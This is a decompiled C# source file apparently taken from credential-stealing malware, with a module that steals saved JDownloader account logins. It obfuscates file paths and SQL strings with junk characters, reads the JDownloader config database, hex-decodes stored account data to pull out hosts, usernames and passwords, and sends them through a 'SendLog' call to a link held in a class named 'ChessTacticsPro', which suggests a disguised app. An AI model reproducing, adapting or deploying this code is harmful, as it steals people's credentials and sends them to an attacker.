using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200000D RID: 13
public class JDownloader
{
	// Token: 0x06000043 RID: 67 RVA: 0x0000352C File Offset: 0x0000252C
	public static void Recover()
	{
		string text = null;
		string host = null;
		StringBuilder stringBuilder = new StringBuilder();
		string path;
		if (Interaction.Environ("Programfiles(x86)") == null)
		{
			path = Interaction.Environ("programfiles") + "$\\jDow$nloader\\$config\\dat$abase.scr$ipt".Replace("$", "");
		}
		else
		{
			path = Interaction.Environ("programfiles(x86)") + "$\\jD$ownloader\\con$fig\\databa$se.sc$ript".Replace("$", "");
		}
		checked
		{
			if (File.Exists(path))
			{
				string text2 = "#INS#ERT INT#O CON#FIG VA#LUE#S('A#ccoun#tContr#oller#','".Replace("#", null);
				string[] array = File.ReadAllLines(path);
				int num = 0;
				int num2 = array.Length - 1;
				for (int i = num; i <= num2; i++)
				{
					if (array[i].Contains(text2))
					{
						string text3 = array[i].Substring(text2.Length - 1).Substring(1, array[i].Length - (text2.Length + 1 + 3));
						int num3 = 0;
						int num4 = text3.Length - 1;
						for (int j = num3; j <= num4; j += 2)
						{
							text += Conversions.ToString(Strings.Chr(Conversions.ToInteger("&H" + text3.Substring(j, 2))));
						}
						text3 = "";
						string[] array2 = text.Split(new char[]
						{
							'\0'
						});
						int num5 = 0;
						int num6 = array2.Length - 1;
						for (int k = num5; k <= num6; k++)
						{
							int num7 = 1;
							do
							{
								array2[k] = array2[k].Replace(Conversions.ToString(Strings.Chr(num7)), "");
								num7++;
							}
							while (num7 <= 31);
							array2[k] = array2[k].Replace("ÿ", "");
							if (Operators.CompareString(array2[k], "", false) != 0)
							{
								text3 = text3 + "\r\n" + array2[k];
							}
						}
						string[] array3 = text3.ToString().Split(new char[]
						{
							'\r'
						});
						int num8 = 0;
						int num9 = array3.Length - 2;
						for (int l = num8; l <= num9; l++)
						{
							if (array3[l].EndsWith("sq") & array3[l].IndexOf(".") > 0)
							{
								host = array3[l].Substring(0, array3[l].Length - 2);
							}
							if (array3[l].EndsWith("t") & array3[l + 1].EndsWith("xt"))
							{
								string password = array3[l].Substring(0, array3[l].Length - 1);
								string username = array3[l + 1].Substring(0, array3[l + 1].Length - 2);
								Send.SendLog(ChessTacticsPro.P_Link, "Passwords", null, null, "JDownloader", host, username, password, null);
							}
						}
					}
				}
			}
		}
	}
}
